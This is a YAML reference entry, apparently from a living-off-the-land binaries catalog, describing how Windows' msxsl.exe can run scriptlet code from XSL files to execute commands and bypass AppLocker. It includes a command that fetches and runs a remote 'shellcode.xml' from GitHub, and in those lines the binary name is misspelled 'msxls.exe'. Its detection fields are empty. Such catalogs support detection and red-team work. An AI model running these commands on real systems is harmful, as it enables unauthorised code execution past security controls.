---
Name: msxsl.exe
Description: Command line utility used to perform XSL transformations.
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: msxsl.exe customers.xml script.xsl
    Description: Run COM Scriptlet code within the script.xsl file (local).
    Usecase: Local execution of script stored in XSL file.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: msxsl.exe customers.xml script.xsl
    Description: Run COM Scriptlet code within the script.xsl file (local).
    Usecase: Local execution of script stored in XSL file.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
    Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
    Usecase: Local execution of remote script stored in XSL script stored as an XML file.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
    Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
    Usecase: Local execution of remote script stored in XSL script stored as an XML file.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
Full_Path:
  - Path:
Code_Sample:
  - Code:
Detection:
  - IOC:
Resources:
  - Link: https://twitter.com/subTee/status/877616321747271680
  - Link: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
